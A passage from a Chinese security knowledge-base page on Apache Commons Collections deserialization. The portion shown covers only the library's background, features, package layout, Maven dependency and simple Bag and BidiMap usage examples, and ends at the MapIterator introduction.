<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-代码审计/Java安全/反序列化链分析/Apache_Commons_Collections中的反序列化" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">Apache_Commons_Collections中的反序列化 | d4m1ts 知识库</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.gm7.org/docs/代码审计/Java安全/反序列化链分析/Apache_Commons_Collections中的反序列化"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Apache_Commons_Collections中的反序列化 | d4m1ts 知识库"><meta data-rh="true" name="description" content="基础使用"><meta data-rh="true" property="og:description" content="基础使用"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.gm7.org/docs/代码审计/Java安全/反序列化链分析/Apache_Commons_Collections中的反序列化"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/代码审计/Java安全/反序列化链分析/Apache_Commons_Collections中的反序列化" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/代码审计/Java安全/反序列化链分析/Apache_Commons_Collections中的反序列化" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://0LMFVYF6KV-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"代码审计","item":"https://blog.gm7.org/docs/代码审计/"},{"@type":"ListItem","position":2,"name":"反序列化链分析","item":"https://blog.gm7.org/docs/category/反序列化链分析"},{"@type":"ListItem","position":3,"name":"Apache_Commons_Collections中的反序列化","item":"https://blog.gm7.org/docs/代码审计/Java安全/反序列化链分析/Apache_Commons_Collections中的反序列化"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="d4m1ts 知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="d4m1ts 知识库 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="d4m1ts 知识库" href="/opensearch.xml"><link rel="stylesheet" href="/assets/css/styles.933499b4.css">
<script src="/assets/js/runtime~main.188591bd.js" defer="defer"></script>
<script src="/assets/js/main.f3e1b88f.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">知识库</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/渗透测试/">渗透测试</a><button aria-label="展开侧边栏分类 &#x27;渗透测试&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/代码审计/">代码审计</a><button aria-label="折叠侧边栏分类 &#x27;代码审计&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/category/审计基础">Java安全</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/审计基础">审计基础</a><button aria-label="展开侧边栏分类 &#x27;审计基础&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/反序列化链分析">反序列化链分析</a><button aria-label="折叠侧边栏分类 &#x27;反序列化链分析&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/代码审计/Java安全/反序列化链分析/Apache_Commons_Collections中的反序列化">Apache_Commons_Collections中的反序列化</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/反序列化链分析/URLDNS链分析">URLDNS链分析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/反序列化链分析/ysoserial-C3P0分析">ysoserial-C3P0分析</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/应用漏洞分析">应用漏洞分析</a><button aria-label="展开侧边栏分类 &#x27;应用漏洞分析&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/rce回显链">RCE回显链</a><button aria-label="展开侧边栏分类 &#x27;RCE回显链&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/内存马">内存马</a><button aria-label="展开侧边栏分类 &#x27;内存马&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/cc">C:C++</a><button aria-label="展开侧边栏分类 &#x27;C:C++&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/codeql">codeql</a><button aria-label="展开侧边栏分类 &#x27;codeql&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/编程开发/GO/GO基础/">编程开发</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/前置基础知识">移动安全</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/应急响应/简介/">应急响应</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/日常使用">AI</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/暂未分类/自建网盘/h5ai/">暂未分类</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/致谢">致谢</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/更新日志">更新日志</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/代码审计/"><span>代码审计</span></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Java安全</span></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/category/反序列化链分析"><span>反序列化链分析</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Apache_Commons_Collections中的反序列化</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_bxCs"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Apache_Commons_Collections中的反序列化</h1></header><h2 class="anchor anchorWithStickyNavbar_LWe7" id="基础使用">基础使用<a href="#基础使用" class="hash-link" aria-label="基础使用的直接链接" title="基础使用的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="背景介绍">背景介绍<a href="#背景介绍" class="hash-link" aria-label="背景介绍的直接链接" title="背景介绍的直接链接">​</a></h3>
<p><a href="http://commons.apache.org/" target="_blank" rel="noopener noreferrer">Apache Commons</a>是Apache软件基金会的项目，曾经隶属于<code>Jakarta</code>项目。<code>Commons</code>的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：<code>Proper</code>（是一些已发布的项目）、<code>Sandbox</code>（是一些正在开发的项目）和<code>Dormant</code>（是一些刚启动或者已经停止维护的项目）。</p>
<p><a href="http://commons.apache.org/proper/commons-collections/" target="_blank" rel="noopener noreferrer">Commons Collections</a>包为Java标准的<code>Collections API</code>提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="主要特点">主要特点<a href="#主要特点" class="hash-link" aria-label="主要特点的直接链接" title="主要特点的直接链接">​</a></h3>
<p>Commons Collections 的主要特点如下 -</p>
<ul>
<li><strong>Bag</strong> - <code>Bag</code> 接口简化了每个对象具有多个副本的集合。</li>
<li><strong>BidiMap</strong>- <code>BidiMap</code> 接口提供双向映射，可用于使用键或键使用的值来查找值。</li>
<li><strong>MapIterator</strong> - <code>MapIterator</code> 接口为映射提供了简单和易于迭代方法。</li>
<li><strong>转换装饰器</strong> - 转换装饰器 (<code>Transforming Decorators</code>) 可以在集合添加到集合时改变集合的每个对象。</li>
<li><strong>复合集合</strong> - 复合集合用于要求统一处理多个集合的情况。</li>
<li><strong>有序映射</strong> - 有序映射保留元素添加的顺序。</li>
<li><strong>有序集</strong> - 有序集保留元素添加的顺序。</li>
<li><strong>参考映射</strong> - 参考映射允许在密切控制下对键 / 值进行垃圾收集。</li>
<li><strong>比较器实现</strong> - 许多比较器实现都可用。</li>
<li><strong>迭代器实现</strong> - 许多迭代器实现都可用。</li>
<li><strong>适配器类</strong> - 适配器类可用于将数组和枚举转换为集合。</li>
<li><strong>实用程序</strong> - 实用程序可用于测试测试或创建集合的典型集合理论属性，如联合，交集。 支持关闭。</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="包结构介绍">包结构介绍<a href="#包结构介绍" class="hash-link" aria-label="包结构介绍的直接链接" title="包结构介绍的直接链接">​</a></h3>
<blockquote>
<p>Commons Collections的最新版是4.x (commons-collections4)，但由于工作中大多还是3.x的版本，这里就以3.x中的最后一个版本3.2.2作使用介绍。</p>
</blockquote>
<p>以下是Collections的包结构和简单介绍，如果你想了解更多的各个包下的接口和实现，请参考<a href="http://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/index.html" target="_blank" rel="noopener noreferrer">Apache Commons Collections 3.2.2 API文档</a>。</p>
<ul>
<li><code>org.apache.commons.collections</code> – CommonsCollections自定义的一组公用的接口和工具类</li>
<li><code>org.apache.commons.collections.bag</code> – 实现Bag接口的一组类</li>
<li><code>org.apache.commons.collections.bidimap</code> – 实现BidiMap系列接口的一组类</li>
<li><code>org.apache.commons.collections.buffer</code> – 实现Buffer接口的一组类</li>
<li><code>org.apache.commons.collections.collection</code> –实现java.util.Collection接口的一组类</li>
<li><code>org.apache.commons.collections.comparators</code>– 实现java.util.Comparator接口的一组类</li>
<li><code>org.apache.commons.collections.functors</code> –Commons Collections自定义的一组功能类</li>
<li><code>org.apache.commons.collections.iterators</code> – 实现java.util.Iterator接口的一组类</li>
<li><code>org.apache.commons.collections.keyvalue</code> – 实现集合和键/值映射相关的一组类</li>
<li><code>org.apache.commons.collections.list</code> – 实现java.util.List接口的一组类</li>
<li><code>org.apache.commons.collections.map</code> – 实现Map系列接口的一组类</li>
<li><code>org.apache.commons.collections.set</code> – 实现Set系列接口的一组类</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="引入依赖">引入依赖<a href="#引入依赖" class="hash-link" aria-label="引入依赖的直接链接" title="引入依赖的直接链接">​</a></h3>
<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">commons-collections</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">commons-collections</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">3.2.2</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="使用介绍">使用介绍<a href="#使用介绍" class="hash-link" aria-label="使用介绍的直接链接" title="使用介绍的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="通用集合-bag">通用集合 Bag<a href="#通用集合-bag" class="hash-link" aria-label="通用集合 Bag的直接链接" title="通用集合 Bag的直接链接">​</a></h4>
<p><code>Bag</code> 接口定义了一个集合，它可以计算一个对象出现在集合中的次数。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.Bag;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.bag.HashBag;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class App{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Bag bag = new HashBag();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        bag.add(&quot;a&quot;, 2);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        bag.add(&quot;b&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        bag.add(&quot;c&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        bag.add(&quot;c&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(bag);    // [2:a,1:b,2:c]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(bag.getCount(&quot;c&quot;));  // 2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(bag.uniqueSet());    // [a, b, c]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        bag.remove(&quot;a&quot;, 1);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(bag); // [1:a,1:b,2:c]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="通用集合-bidimap">通用集合 BidiMap<a href="#通用集合-bidimap" class="hash-link" aria-label="通用集合 BidiMap的直接链接" title="通用集合 BidiMap的直接链接">​</a></h4>
<p><code>BidiMap</code> 接口被添加到支持双向映射。 使用双向映射，可以使用值查找键，并且可以使用键轻松查找值。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.BidiMap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.bidimap.TreeBidiMap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class App {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        BidiMap bidiMap = new TreeBidiMap();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        bidiMap.put(&quot;a&quot;, &quot;b&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        bidiMap.put(&quot;c&quot;, &quot;d&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(bidiMap);    // {a=b, c=d}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(bidiMap.get(&quot;a&quot;));   // b</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(bidiMap.getKey(&quot;b&quot;)); // a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(bidiMap.inverseBidiMap()); // {b=a, d=c}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        bidiMap.remove(&quot;a&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(bidiMap); // {c=d}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="通用集合-mapiterator">通用集合 MapIterator<a href="#通用集合-mapiterator" class="hash-link" aria-label="通用集合 MapIterator的直接链接" title="通用集合 MapIterator的直接链接">​</a></h4>
<p>JDK Map 接口很难作为迭代在 <code>EntrySet</code> 或 <code>KeySet</code> 对象上迭代。 <code>MapIterator</code> 提供了对 <code>Map</code> 的简单迭代。</p>
